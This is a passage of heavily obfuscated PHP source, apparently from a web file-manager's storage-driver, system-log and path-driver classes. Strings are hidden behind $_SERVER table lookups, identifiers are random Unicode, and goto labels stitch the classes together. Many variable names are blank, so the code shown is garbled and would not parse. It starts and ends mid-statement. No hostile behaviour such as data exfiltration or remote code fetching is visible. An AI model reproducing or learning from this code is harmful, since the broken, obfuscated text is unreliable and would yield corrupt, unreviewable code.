= Cache::get($); if ($) { return $; } $д = array($[932] => $[487], $[2515] => $[79]); $ׅڏ = array($[932] => array($[7], $ј̇)); $ = Model($[922])->field($д)->where($ׅڏ)->group($[932])->select(); $ = array_to_keyvalue($, $[487], $[79]); Cache::set($, $, 600); return $; } public function getConfig($Ρ) { $ = parent::listData($Ρ); $״ = _get($, $_SERVER[ܮ][6], array()); if ($״ && !is_array($״)) { $״ = json_decode($״, !0); } return $״; } public function update($й, $) { $̷Յː =& $_SERVER[ܮ]; $× = $[$̷Յː[32]]; $ = array_to_keyvalue(parent::listData(), $̷Յː[32]); if (isset($[$×]) && $[$×][$̷Յː[487]] != $й) { return !1; } $this->checkPwd($й, $); if (isset($[$̷Յː[2516]]) && $[$̷Յː[2516]] == $̷Յː[91]) { $this->checkConfig($); } unset($[$̷Յː[2516]]); $θ = parent::update($й, $); if ($θ && $[$̷Յː[37]]) { foreach ($ as $̆) { if ($̆[$̷Յː[37]] && $̆[$̷Յː[487]] != $й) { parent::update($̆[$̷Յː[487]], array($̷Յː[37] => 0)); } } $this->updateBackup($й, $); } return $θ; } public function add($ߋ) { $Ͼ =& $_SERVER[ܮ]; $ɯڙ = array_to_keyvalue(parent::listData(), $Ͼ[32]); if (isset($ɯڙ[$ߋ[$Ͼ[32]]])) { return !1; } $this->checkConfig($ߋ); $ = parent::insert($ߋ); if ($ && $ߋ[$Ͼ[37]]) { foreach ($ɯڙ as $˪٭) { if ($˪٭[$Ͼ[37]]) { parent::update($˪٭[$Ͼ[487]], array($Ͼ[37] => 0)); } } $this->updateBackup($, $ɯڙ); } return $; } public function updateBackup($ݗ, $) { $ =& $_SERVER[ܮ]; $ټ = Model($[871])->get($[877]); $ټ = json_decode($ټ, !0); if (!$ټ) { return; } if ($ټ[$[1947]] != $[91]) { return; } $ۮހ = $ټ[$[850]]; if ($ټ[$[168]] != $[1308]) { if ($ۮހ != $ݗ) { return; } $ټ[$[168]] = $[1308]; } else { if ($ۮހ == $ݗ) { return; } $ټ[$[850]] = $ݗ; } Model($[871])->set(array($[877] => $ټ)); } public function checkPwd($, &$˩) { $󴯥 =& $_SERVER[ܮ]; if (empty($˩[$󴯥[6]])) { return; } $ҭ = $˩[$󴯥[6]]; if (!is_array($ҭ)) { $ҭ = json_decode($ҭ, !0); } $؜ = $󴯥[12]; $ = array($󴯥[1642], $󴯥[2517], $󴯥[1051]); foreach ($ as $י) { if (isset($ҭ[$י])) { $؜ = $י; break; } } if (!$؜) { return; } $ = $this->getConfig($); $؈ = $[$؜]; $ = $ҭ[$؜]; if ($ == str_repeat($󴯥[220], strlen($؈))) { $ҭ[$؜] = $؈; $˩[$󴯥[6]] = json_encode($ҭ); } else { if ($ != $؈) { $˩[$󴯥[2516]] = $󴯥[91]; } } } public function checkConfig(&$շ, $䩇 = false) { $ =& $_SERVER[ܮ]; $և = strtolower($շ[$[96]]); $ = $շ[$[6]]; if (!is_array($)) { $ = json_decode($, !0); } foreach ($ as $ => $ã) { if (is_string($ã)) { $[$] = trim($ã); } } $[$[2518]] = rand_string(6); $ = $GLOBALS[$[6]][$[92]][$[940]]; $ػ = isset($[$և]) ? $[$և] : ucfirst($և); $ڢ = $[77] . $ػ; if (!$ػ || !class_exists($ڢ)) { if ($䩇) { return LNG($[2519]); } write_log(array($[2520], $շ, get_caller_info()), $[213]); show_json(LNG($[2519]), !1, $շ); } $Ư = new $ڢ($); $ϒ = rtrim($[$[1369]], $[8]) . $[8]; if (in_array($և, $Ư->objectDriver)) { try { if (!$Ư->isBucketCors() && !$Ư->setBucketCors()) { $𼛆 = LNG($[2521]); $𼛆 .= $[2522] . LNG($[2523]); } } catch (Exception $ڢ) { $𼛆 = $ڢ->getMessage(); } if (isset($𼛆)) { return $this->_parseError($𼛆, $և, $䩇); } if ($և == $[68]) { $ٔ = $Ư->getBktRegion(); if ($ٔ != $[$[2524]]) { $[$[2524]] = $ٔ; $Ư->setRegion($ٔ); } } } else { if ($և == $[2525]) { if ($Ư->ftpPath) { $ = trim($ϒ, $[8]); if (stripos($, trim($Ư->ftpPath, $[8])) !== 0) { $ϒ = $Ư->ftpPath . $[8] . ($ ? $ . $[8] : $[12]); } } } } $ྥ = $Ư->getPath($ϒ . $[1374]); try { if ($և == $[106]) { $Ư->mkdir($ϒ, REPEAT_SKIP); } $Ɇ = $Ư->mkfile($ྥ, $[12], REPEAT_REPLACE); if (!$Ɇ) { $𼛆 = LNG($[2521]); } } catch (Exception $ڢ) { $𼛆 = $ڢ->getMessage(); } if (isset($𼛆)) { return $this->_parseError($𼛆, $և, $䩇); } $[$[1369]] = $ϒ; $շ[$[6]] = json_encode($); $շ[$[96]] = $ػ; return !0; } private function _parseError($, $, $ = false) { $ꤖ =& $_SERVER[ܮ]; if ($ == $ꤖ[68] && stripos($, $ꤖ[2526])) { $ = explode($ꤖ[10], $); $ᅶ = isset($[1]) ? $[1] : $ꤖ[12]; $ǀ = array($ꤖ[2527] => LNG($ꤖ[2528]), $ꤖ[2529] => LNG($ꤖ[2530])); if (isset($ǀ[$ᅶ])) { $ = $ǀ[$ᅶ]; } } if (stripos($, $ꤖ[2531]) === 0) { $ = strpos($, $ꤖ[175]); if ($ === !1) { $ = strpos($, $ꤖ[4]); } if ($ !== !1) { $ = substr($, $ + 1); } } $ = LNG($ꤖ[1377]) . $; if ($) { return $; } show_json($, !1); } public function driverListSystem() { $㾷 =& $_SERVER[ܮ]; $ͩ = parent::listData(); $肍 = array(); foreach ($ͩ as $ޕ) { unset($ޕ[$㾷[231]], $ޕ[$㾷[88]]); if (!is_array($ޕ[$㾷[6]])) { $ޕ[$㾷[6]] = json_decode($ޕ[$㾷[6]], !0); } $肍[] = $ޕ; } return $肍; } public function defaultDriver() { $ =& $_SERVER[ܮ]; $ = parent::listData(); $ތ = array_filter_by_field($, $[37], 1); $ތ = $ތ[0]; if (!$ތ) { return array(); } if (!is_array($ތ[$[6]])) { $ތ[$[6]] = json_decode($ތ[$[6]], !0); } return $ތ; } public function driverInfo($) { $ك =& $_SERVER[ܮ]; $ = array_to_keyvalue(parent::listData(), $ك[487]); if (!isset($[$])) { return !1; } $Ɔ = $[$]; if (!is_array($Ɔ[$ك[6]])) { $Ɔ[$ك[6]] = json_decode($Ɔ[$ك[6]], !0); } return $Ɔ; } public function remove($鰶) { $this->removeShareItems($鰶); return parent::remove($鰶); } public function removeWithFile($땊, $, $, $ = false) { $ϙ˫ =& $_SERVER[ܮ]; ignore_timeout(); $ܭ = array($ϙ˫[932] => $땊); $ԃ = Model($ϙ˫[560]); if (isset($GLOBALS[$ϙ˫[2532]])) { $Ð = $GLOBALS[$ϙ˫[2532]]; } else { $Ð = $ԃ->where($ܭ)->field(array($ϙ˫[955] => $ϙ˫[956], $ϙ˫[957] => $ϙ˫[79]))->find(); } $ = intval($Ð[$ϙ˫[956]]); $햿 = intval($Ð[$ϙ˫[79]]); $ƄΕ = $ . $ϙ˫[2533] . $땊; $ = LNG($ == $ϙ˫[643] ? $ϙ˫[2534] : $ϙ˫[2535]); $ҳ = new TaskFileTransfer($ƄΕ, $ϙ˫[213], $, $ . $ϙ˫[476] . $[$ϙ˫[32]] . $ϙ˫[212] . $땊); $ҳ->task[$ϙ˫[862]] = (double) $햿; $ر = KodIO::defaultDriver(); $窯 = $ر[$ϙ˫[487]]; $ = 1; $ = 5000; $Ӻ = $ő = $ך = array(); $ = $ԃ->where($ܭ)->field($ϙ˫[2536])->selectPage($, $); $㔊 = intval($[$ϙ˫[443]][$ϙ˫[445]]); while ($ && $ <= $㔊) { foreach ($[$ϙ˫[446]] as $؏) { $ԥ = $؏[$ϙ˫[557]]; if ($) { $ő[] = $ԥ; continue; } $ = $؏[$ϙ˫[87]]; $ˤ = rtrim(get_path_father($), $ϙ˫[8]) . $ϙ˫[8]; $ך[] = $ˤ; $ˤ = str_replace("\173\151\157\72{$땊}\175\x2f", "\x7b\x69\x6f\72{$窯}\175\x2f", $ˤ); if (!IO::exist($) || !IO::isFile($)) { $Ӻ[] = $ԥ; $ҳ->updateFileEnd($؏[$ϙ˫[32]], $؏[$ϙ˫[79]]); write_log($ϙ˫[2537] . $, $ϙ˫[2117]); continue; } $ = IO::move($, $ˤ, REPEAT_RENAME); if (!$) { $ő[] = $ԥ; $ҳ->updateFileEnd($؏[$ϙ˫[32]], $؏[$ϙ˫[79]]); write_log($ϙ˫[2538] . $, $ϙ˫[2117]); continue; } $ = array($ϙ˫[932] => $窯, $ϙ˫[87] => $); $ԃ->where(array($ϙ˫[557] => $ԥ))->save($); } $++; $ = $ԃ->where($ܭ)->field($ϙ˫[2536])->selectPage($, $); } $˃ = $ҳ->task; if (!$) { Cache::set($ƄΕ, $˃); } $ҳ->end(); $Ӻ = array_unique($Ӻ); $ő = array_unique($ő); if (!$ && ($Ӻ || $ő)) { $ɹމ = array(); if ($Ӻ) { $ɹމ[] = sprintf(LNG($ϙ˫[2539]), count($Ӻ)); } if ($ő) { $ɹމ[] = sprintf(LNG($ϙ˫[2540]), count($ő)); } $ɹމ = sprintf(LNG($ϙ˫[2541]), implode($ϙ˫[1587], $ɹމ)) . $ϙ˫[2542] . date($ϙ˫[2543]) . $ϙ˫[2544]; if ($ == $ϙ˫[1334]) { $ɹމ .= $ϙ˫[2545] . LNG($ϙ˫[2546]); } else { $ɹމ = LNG($ϙ˫[2547]) . $ϙ˫[2548] . $ɹމ; } $˃[$ϙ˫[1371]] = $ɹމ; Cache::set($ƄΕ, $˃); unset($[$ϙ˫[6]]); $ԓ = array($ϙ˫[487] => $땊, $ϙ˫[2423] => $ϙ˫[643], $ϙ˫[32] => $[$ϙ˫[32]], $ϙ˫[96] => $[$ϙ˫[96]]); Hook::trigger($ϙ˫[1987], array($ϙ˫[1393] => $ԓ, $ϙ˫[1403] => !0)); show_json($ɹމ, !1, 100111); } if ($ == $ϙ˫[643]) { return !0; } if ($Ӻ || $ő) { $ݍ = array_merge($Ӻ, $ő); $ݍ = array_filter(array_unique($ݍ)); $this->removeByFileID($ݍ); } if ($ך) { $ך = array_filter(array_unique($ך)); foreach ($ך as $) { $Ð = IO::has($, !0); if (!$Ð[$ϙ˫[239]] && !$Ð[$ϙ˫[240]]) { IO::remove($); } } } return $this->remove($땊); } private function removeByFileID($ǐ = array()) { $Ȼѣ =& $_SERVER[ܮ]; if (empty($ǐ)) { return; } $˩ = array($Ȼѣ[557] => array($Ȼѣ[7], $ǐ)); $ϸ = Model($Ȼѣ[1534])->where($˩)->field($Ȼѣ[2495])->select(); if (!$ϸ) { return Model($Ȼѣ[560])->remove($ǐ); } $ϸ = array_to_keyvalue($ϸ, $Ȼѣ[191], $Ȼѣ[557]); foreach ($ϸ as $ê => $) { Model($Ȼѣ[939])->removeNow($ê, !1); } $صޗ = array_diff($ǐ, array_unique(array_values($ϸ))); if ($صޗ) { return Model($Ȼѣ[560])->remove($صޗ); } } private function removeShareItems($Ē戽) { $ =& $_SERVER[ܮ]; $ = "\173\x69\157\x3a{$Ē戽}\x7d\x2f"; $ = array($[191] => 0, $[583] => array($[473], "{$}\x25")); $œ = Model($[1563])->where($)->field($[687])->select(); if (empty($œ)) { return; } $۾ = array_to_keyvalue($œ, $[12], $[687]); Model($[686])->remove($۾); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\114\151\147\150\164\101\160\x70"; public $modelType = "\x53\x79\163\164\x65\x6d\x4f\160\x74\151\157\x6e"; public $field = array("\x6e\x61\155\x65", "\x67\x72\x6f\x75\x70", "\x64\x65\163\x63", "\143\x6f\x6e\164\145\156\164"); public function listData($ϼ = false, $ȕ = "\155\157\144\x69\x66\x79\x54\x69\x6d\x65", $͂ = true) { return parent::listData($ϼ, $ȕ, $͂); } public function remove($) { $Ά = $this->findByName($); if (!$Ά) { return !1; } return parent::remove($Ά[$_SERVER[ܮ][487]]); } public function add($) { if ($this->findByName($[$_SERVER[ܮ][32]])) { return !1; } return parent::insert($); } public function update($Ė, $) { $亱 =& $_SERVER[ܮ]; $׭ = $this->findByName($Ė); $ᕥҠ = $this->findByName($[$亱[32]]); if (!$׭ || $ᕥҠ && $ᕥҠ[$亱[487]] != $׭[$亱[487]]) { return !1; } return parent::update($׭[$亱[487]], $); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\x65\x72\164", "\x66\165\156\x63\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ؔ =& $_SERVER[ܮ]; return array($ؔ[2549] => LNG($ؔ[2550]), $ؔ[2551] => LNG($ؔ[2552]), $ؔ[2128] => LNG($ؔ[2553]), $ؔ[2554] => LNG($ؔ[2555]), $ؔ[2556] => LNG($ؔ[2557]), $ؔ[2558] => LNG($ؔ[2559]), $ؔ[2560] => LNG($ؔ[2561]), $ؔ[2155] => LNG($ؔ[2561]), $ؔ[2156] => LNG($ؔ[2562]), $ؔ[2563] => LNG($ؔ[2564]), $ؔ[2565] => LNG($ؔ[2566]), $ؔ[2567] => LNG($ؔ[2568]), $ؔ[2569] => LNG($ؔ[2570]), $ؔ[2153] => LNG($ؔ[2571]), $ؔ[2572] => LNG($ؔ[2573]), $ؔ[2160] => LNG($ؔ[2574]), $ؔ[2575] => LNG($ؔ[2576]), $ؔ[2577] => LNG($ؔ[2578]), $ؔ[2579] => LNG($ؔ[2580]), $ؔ[2581] => LNG($ؔ[2582]), $ؔ[2162] => LNG($ؔ[2583]), $ؔ[2163] => LNG($ؔ[2584]), $ؔ[2585] => LNG($ؔ[2586]), $ؔ[2587] => LNG($ؔ[2588]), $ؔ[2589] => LNG($ؔ[2590]), $ؔ[2158] => LNG($ؔ[2591]), $ؔ[2592] => LNG($ؔ[2593]), $ؔ[2157] => LNG($ؔ[2594]), $ؔ[2595] => LNG($ؔ[2595]), $ؔ[2596] => LNG($ؔ[2597]), $ؔ[2598] => LNG($ؔ[2595]), $ؔ[2599] => LNG($ؔ[2600]), $ؔ[2601] => LNG($ؔ[2602]), $ؔ[2603] => LNG($ؔ[2602]), $ؔ[2604] => LNG($ؔ[2605]), $ؔ[2606] => LNG($ؔ[2606]), $ؔ[2607] => LNG($ؔ[2132]), $ؔ[2608] => LNG($ؔ[2609]), $ؔ[2610] => LNG($ؔ[2611]), $ؔ[2612] => LNG($ؔ[2613]), $ؔ[2614] => LNG($ؔ[2615]), $ؔ[2616] => LNG($ؔ[2617]), $ؔ[2618] => LNG($ؔ[2618]), $ؔ[2619] => LNG($ؔ[2620]), $ؔ[2621] => LNG($ؔ[2622]), $ؔ[2623] => LNG($ؔ[2624]), $ؔ[2625] => LNG($ؔ[2626]), $ؔ[2627] => LNG($ؔ[2628]), $ؔ[2629] => LNG($ؔ[2630]), $ؔ[210] => LNG($ؔ[210]), $ؔ[211] => LNG($ؔ[2631]), $ؔ[2632] => LNG($ؔ[2632])); } private function typeFile() { $ҋ =& $_SERVER[ܮ]; $Ƞ = array($ҋ[2160] => array($ҋ[2161]), $ҋ[2567] => array($ҋ[2633]), $ҋ[2569] => array($ҋ[2634]), $ҋ[2153] => array($ҋ[2154], $ҋ[2635]), $ҋ[2577] => array(), $ҋ[2579] => array(), $ҋ[2581] => array(), $ҋ[2162] => array($ҋ[2164]), $ҋ[2163] => array($ҋ[2164]), $ҋ[2585] => array($ҋ[2636]), $ҋ[2587] => array($ҋ[2636]), $ҋ[2589] => array($ҋ[2637]), $ҋ[2575] => array($ҋ[2638]), $ҋ[2158] => array($ҋ[2639]), $ҋ[2592] => array($ҋ[2640]), $ҋ[2157] => array($ҋ[2159])); return $Ƞ; } private function typeAll() { $Ɂ =& $_SERVER[ܮ]; $ = $this->typeList; $ = array_filter($this->typeFile()); foreach ($ as $ⳓ => $ٲ) { $[$ٲ[0]] = $[$ⳓ]; } $[$Ɂ[2164]] = LNG($Ɂ[2641]); $[$Ɂ[2636]] = LNG($Ɂ[2642]); return $; } public function addLog($, $̻ = array()) { $׵ =& $_SERVER[ܮ]; if (!isset($this->typeList[$])) { return; } $ߟΎ = Session::get($׵[2321]); if (!$ߟΎ) { $ߟΎ = _get($̻, $׵[1593], 0); } if ($ == $׵[2608] && is_array($̻[$׵[2643]]) && !$̻[$׵[2643]]) { return; } $濐 = get_client_ip(); if (!$̻ || strlen(json_encode($̻)) >= 1024 * 64) { if ($̻ && is_array($̻)) { $̻ = array_intersect_key($̻, array_flip($׵[487], $׵[32])); $̻[$׵[1609]] = $濐; } else { $̻ = array($׵[1609] => $濐); } } else { if (is_array($̻)) { $̻[$׵[1609]] = $濐; } else { $̻ = array($׵[1393] => $̻, $׵[1609] => $濐); } } $̻[$׵[2644]] = ACTION; $̻ = array($׵[1967] => Session::sign(), $׵[1968] => intval($ߟΎ), $׵[33] => $, $׵[1970] => json_encode($̻)); Hook::trigger($׵[2645], $̻); return parent::add($̻); } public function remove($) { $this->where(array($_SERVER[ܮ][508] => $))->delete(); } private function _makeOrder($ڎ = '') { $۝ =& $_SERVER[ܮ]; $˱ = $۝[231]; $ = array($۝[537] => $۝[538], $۝[539] => $۝[540]); $ = Input::get($۝[545], $۝[7], $۝[2358], array($۝[2277], $۝[539])); $ = $[$]; $ڎ = $ڎ . "{$˱}\x20{$}"; return $this->order($ڎ); } public function get($攧 = '') { $汩 =& $_SERVER[ܮ]; if (!$攧) { show_json(array()); } $ = array(); if ($攧[$汩[1593]]) { $[$汩[1593]] = $攧[$汩[1593]]; } if (isset($攧[$汩[859]])) { $ = $攧[$汩[859]]; $ = isset($攧[$汩[860]]) ? $攧[$汩[860]] : time(); $[$汩[231]] = array($汩[408], array($, $)); } if ($攧[$汩[33]]) { $ˀ = explode($汩[50], $攧[$汩[33]]); $ث = $this->typeFile(); $ᑺ = array(); foreach ($ˀ as $侼) { $ᑺ[] = $侼; if (isset($ث[$侼])) { $ᑺ = array_merge($ᑺ, $ث[$侼]); } } $ᑺ = array_unique($ᑺ); if ($ᑺ) { $[$汩[33]] = array($汩[7], $ᑺ); } } else { $[$汩[33]] = array($汩[2646], $汩[2647]); } if (!empty($攧[$汩[1609]])) { $[$汩[540]] = array($汩[473], "\x25{$攧[$汩[1609]]}\45"); } $ = $this->_makeOrder()->where($)->selectPage(); if (empty($[$汩[446]])) { show_json(array(), !0, $[$汩[443]]); } $[$汩[446]] = $this->logList($[$汩[446]]); return $; } private function ipAddress(&$) { $ݝ =& $_SERVER[ܮ]; if (!empty($[$ݝ[1609]])) { $⌢ހ = IpLocation::get($[$ݝ[1609]]); } else { $⌢ހ = LNG($ݝ[2648]); } $[$ݝ[2649]] = $⌢ހ; } private function descZipDownload($, &$) { $ =& $_SERVER[ܮ]; if (!isset($[$[1616]])) { return; } $ = json_decode($[$[1616]], !0); foreach ($ as $σȷ) { try { $ӓ = IO::infoFullSimple($σȷ[$[87]]); } catch (Exception $) { continue; } $[$[87]] = $σȷ[$[87]]; $[] = $[$[191]] = $ӓ[$[191]]; $[] = $[$[2418]] = $ӓ[$[190]]; break; } return $; } private function getSourceList(&$ݩ) { $ƾ =& $_SERVER[ܮ]; $哈 = array(); foreach ($ݩ as $ș => $س) { $ϛ = json_decode($س[$ƾ[540]], !0); if ($س[$ƾ[33]] == $ƾ[2156]) { $ϛ = $this->descZipDownload($ϛ, $哈); $ݩ[$ș][$ƾ[540]] = json_encode($ϛ); continue; } if (strpos($س[$ƾ[33]], $ƾ[2420]) !== 0) { if (!isset($ϛ[$ƾ[87]]) || strpos($س[$ƾ[33]], $ƾ[2650]) !== 0) { continue; } try { $ֶ = IO::infoFullSimple($ϛ[$ƾ[87]]); } catch (Exception $喰) { continue; } $哈[] = $ϛ[$ƾ[191]] = $ֶ[$ƾ[191]]; $哈[] = $ϛ[$ƾ[2418]] = $ֶ[$ƾ[190]]; $ݩ[$ș][$ƾ[540]] = json_encode($ϛ); continue; } $哈[] = $ϛ[$ƾ[191]]; $哈[] = $ϛ[$ƾ[2418]]; if ($ϛ[$ƾ[33]] == $ƾ[643]) { $哈[] = $ϛ[$ƾ[540]][$ƾ[1346]]; $哈[] = $ϛ[$ƾ[540]][$ƾ[1347]]; } if ($ϛ[$ƾ[33]] == $ƾ[2428]) { $哈[] = $ϛ[$ƾ[540]][$ƾ[191]]; } } if (!$哈) { return array(); } return Model($ƾ[939])->sourceListInfo($哈, !0); } private function logList($) { $ =& $_SERVER[ܮ]; $ = array_to_keyvalue($, $[12], $[1593]); $ = Model($[617])->userListInfo(array_unique($)); $װ = $this->getSourceList($); $◤ = $this->typeAll(); $ȫ = array(); $ = array(); foreach ($ as $ => $῟) { $ֹ = $῟[$[33]]; $ֳ = isset($[$῟[$[1593]]]) ? $[$῟[$[1593]]] : !1; $н = strpos($ֹ, $[2651]) === 0 ? LNG($[2652]) : LNG($[2648]); $῟[$[32]] = isset($ֳ[$[32]]) ? $ֳ[$[32]] : LNG($[2648]); $῟[$[2476]] = isset($ֳ[$[2476]]) ? $ֳ[$[2476]] : $[12]; $῟[$[1866]] = isset($◤[$ֹ]) ? $◤[$ֹ] : $н; $῟[$[2357]] = $ֳ; $ = json_decode($῟[$[540]], !0); $῟[$[1609]] = isset($[$[1609]]) ? $[$[1609]] : $[12]; $῟[$[2649]] = IpLocation::get($῟[$[1609]]); if (strpos($ֹ, $[2420]) === 0 || isset($[$[2418]])) { $[$[90]] = $װ[$[$[191]]]; $[$[2434]] = $װ[$[$[2418]]]; if ($[$[33]] == $[643]) { $[$[540]][$[1346]] = $װ[$[$[540]][$[1346]]]; $[$[540]][$[1347]] = $װ[$[$[540]][$[1347]]]; } if ($[$[33]] == $[2428]) { $[$[540]][$[191]] = $װ[$[$[540]][$[191]]]; } if ($[$[33]] == $[1334]) { $[$[2434]] = $[$[90]]; $[$[2418]] = $[$[2434]][$[191]]; $[$[90]] = !1; $[$[191]] = $[12]; } $㥕 = array($[1334], $[2416]); if (!in_array($[$[33]], $㥕)) { if ($[$[90]] && $[$[90]][$[188]] == $[189]) { $[] = $῟[$[487]]; unset($[$]); continue; } if ($[$[2434]] && $[$[2434]][$[188]] == $[189]) { $[] = $῟[$[487]]; unset($[$]); continue; } } } $῟[$[540]] = $; unset($῟[$[2653]]); $ȫ[] = $῟; } $this->clearSystemPathLog($); return $ȫ; } private function clearSystemPathLog($髫) { $ʗ =& $_SERVER[ܮ]; if (count($髫) == 0) { return; } $ = array($ʗ[487] => array($ʗ[7], array_unique($髫))); $this->where($)->delete(); } public function deviceList($ᢘß, $Ѽ = 0) { $ =& $_SERVER[ܮ]; $ˌ = array($[1593] => $ᢘß, $[231] => array($[1182], $Ѽ), $[33] => $[2128]); $⇰ = array(); $ = $this->field($[2654])->where($ˌ)->order($[2432])->limit(50)->select(); foreach ($ as $Ȕ => $) { if ($Ȕ > 0 && abs($[$[231]] - $[$Ȕ - 1][$[231]]) < 5) { continue; } $ߍ = json_decode($[$[540]], !0); $[$[1609]] = isset($ߍ[$[1609]]) ? $ߍ[$[1609]] : $[12]; unset($ߍ[$[1609]]); $ = $this->deviceType($ߍ[$[2421]]); if (isset($⇰[$])) { continue; } $[$[2649]] = IpLocation::get($[$[1609]]); $[$[540]] = $ߍ; $⇰[$] = $; } return array_values($⇰); } public function deviceType($) { return $; } } goto a쪵; Dȇ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($) { $Ϙ =& $_SERVER[ܮ]; parent::__construct($); $ = isset($[$Ϙ[256]]) && $[$Ϙ[256]] == $Ϙ[247] ? $Ϙ[247] : $Ϙ[313]; $this->setSignVersion($); } public function link($ֵ, $ = array()) { return parent::link($ֵ, $); } public function fileOut($ȥ, $ = false, $ = false, $ν = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ܮ][314])) { return parent::fileOutServer($ȥ, $, $, $ν); } parent::fileOut($ȥ, $, $, $ν); } public function fileOutImage($ߞ, $ = 250) { if (strstr($this->endpoint, $_SERVER[ܮ][314])) { return parent::fileOutImageServer($ߞ, $); } parent::fileOutImage($ߞ, $); } } define($_SERVER[ܮ][315], 1); define($_SERVER[ܮ][316], 2); goto có; E: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¡ =& $_SERVER[ܮ]; $this->objectDriver = array($¡[60], $¡[61], $¡[62], $¡[63], $¡[64], $¡[65], $¡[66], $¡[67], $¡[68], $¡[69], $¡[70], $¡[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ƻހ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ƻހ, $_SERVER[ܮ][8]); } return $ƻހ; } public function iconvApp($) { return $; } public function iconvSystem($) { return $; } public function iconvTo($ʳ, $ٕ, $Ҿ) { $ݽ =& $_SERVER[ܮ]; if (!$ʳ || !function_exists($ݽ[72])) { return $ʳ; } static $ˢ = array(); $Ŕ = $ٕ . $ݽ[73] . $Ҿ . $ݽ[74] . $ʳ; if (isset($ˢ[$Ŕ])) { return $ˢ[$Ŕ]; } if (function_exists($ݽ[75])) { $径 = @mb_convert_encoding($ʳ, $Ҿ, $ٕ); } else { $径 = @iconv($ٕ, $Ҿ, $ʳ); } $径 = $径 ? $径 : $ʳ; if (strstr($径, $ݽ[76])) { $径 = str_replace($ݽ[76], $ݽ[11], $径); } $ˢ[$ٕ . $ݽ[73] . $Ҿ . $ݽ[74] . $ʳ] = $径; $ˢ[$Ҿ . $ݽ[73] . $ٕ . $ݽ[74] . $ʳ] = $ʳ; $ˢ[$Ҿ . $ݽ[73] . $ٕ . $ݽ[74] . $径] = $ʳ; $ˢ[$ٕ . $ݽ[73] . $Ҿ . $ݽ[74] . $径] = $径; return $径; } public function getPathInner($쥦) { $ = IO::init($쥦); return $->path; } public function getPathOuter($ס) { $܃ =& $_SERVER[ܮ]; $ = strlen(trim($this->pathBase, $܃[8])); $ס = substr(trim($ס, $܃[8]), $); return $this->pathDriver . $܃[8] . ltrim($ס, $܃[8]); } public function isParentOf($ᴶ, $) { $ٙ =& $_SERVER[ܮ]; $ᴶ = rtrim(strtolower($ᴶ), $ٙ[8]) . $ٙ[8]; $ = rtrim(strtolower($), $ٙ[8]) . $ٙ[8]; $י = strpos($, $ᴶ) === 0; return $י; } public function getType() { $͛ =& $_SERVER[ܮ]; $ʁƻ = str_replace($͛[77], $͛[12], get_class($this)); return strtolower($ʁƻ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ڷ, $Ǧ) { $и =& $_SERVER[ܮ]; $уˋ = rtrim($ڷ, $и[8]) . $и[8] . $Ǧ; $ي = $this->exist($уˋ); return $ي ? $уˋ : !1; } public function setModifyTime($, $ = '') { } public function renameObject($ᝥ, $˖) { $ܙЋ = $˖; $ᝥ = $this->getPathOuter($ᝥ); $˖ = $this->pathFather($ᝥ) . $˖; $ͽ° = IO::copy($ᝥ, $this->pathFather($ᝥ), REPEAT_RENAME_FOLDER, $ܙЋ); if ($ͽ°) { IO::remove($ᝥ); } return $ͽ° ? $˖ : !1; } public function tempFile($ʥ = '', $΅ = '') { if (!$ʥ) { $ʥ = rand_string(15); } $䛴 = TEMP_FILES . rand_string(15) . $_SERVER[ܮ][8]; @mkdir($䛴, DEFAULT_PERRMISSIONS, !0); $Ƙ = $䛴 . $ʥ; @touch($Ƙ); if ($΅) { file_put_contents($Ƙ, $΅); } return $Ƙ; } public function tempFileRemve($΀) { @unlink($΀); @rmdir($this->pathFather($΀)); } public function mkfile($, $Ǜ = '', $ = REPEAT_RENAME) { } public function mkdir($, $І = REPEAT_SKIP) { } public function delFile($) { } public function delFolder($ᔋ) { } public function copyFile($թ, $) { } public function moveFile($, $ĝ) { } public function remove($ׯ) { if ($this->isFile($ׯ)) { return $this->delFile($ׯ); } return $this->delFolder($ׯ); } public function rename($, $ס) { } public function exist($⡘) { } public function isFile($Ǭ) { } public function isFolder($Г) { } public function size($ū) { } public function info($֡Р) { } public function infoSimple($̔) { return $this->info($̔); } public function infoAuth($) { return $this->info($); } public function infoFull($ל) { return $this->info($ל); } public function infoFullSimple($) { return $this->info($); } public function infoWithChildren($բұ) { $ޘ =& $_SERVER[ܮ]; static $﷫ = array(); if (isset($﷫[$բұ])) { return $﷫[$բұ]; } $ = $this->info($բұ); if ($ && $[$ޘ[33]] == $ޘ[78]) { $ٓ = array($ޘ[79] => 0, $ޘ[80] => 0, $ޘ[81] => 0); $this->infoChildren($բұ, $ٓ); $[$ޘ[79]] = $ٓ[$ޘ[79]]; $[$ޘ[82]] = array($ޘ[83] => $ٓ[$ޘ[80]], $ޘ[84] => $ٓ[$ޘ[81]]); $﷫[$բұ] = $; } return $; } public function listPath($ϋ, $Ʀ = false) { } public function has($Ӑ, $㦒 = false, $ = false) { } public function canRead($) { } public function canWrite($) { } public function getContent($) { } public function setContent($, $ = '') { } protected function infoChildren($, &$̓) { $ =& $_SERVER[ܮ]; check_abort_echo(); $Ԉ = $this->listPath($, !0); $Ԉ = array_merge($Ԉ[$[85]], $Ԉ[$[86]]); foreach ($Ԉ as $) { if ($[$[33]] == $[78]) { $̓[$[81]]++; $ԏ = $this->getPathInner($[$[87]]); $this->infoChildren($ԏ, $̓); } else { $̓[$[80]]++; $̓[$[79]] += $[$[79]]; } } } public function fileSubstr($壤, $ѡЪ, $⡔) { } public function listAll($罅) { } public function listAllMake($ł, &$) { $ȫ =& $_SERVER[ܮ]; check_abort_echo(); $՛ = $this->listPath($ł, !0); if (!$՛) { return; } $ = array_merge($՛[$ȫ[85]], $՛[$ȫ[86]]); foreach ($ as $ډ) { $ = $ډ[$ȫ[33]] == $ȫ[78]; $ 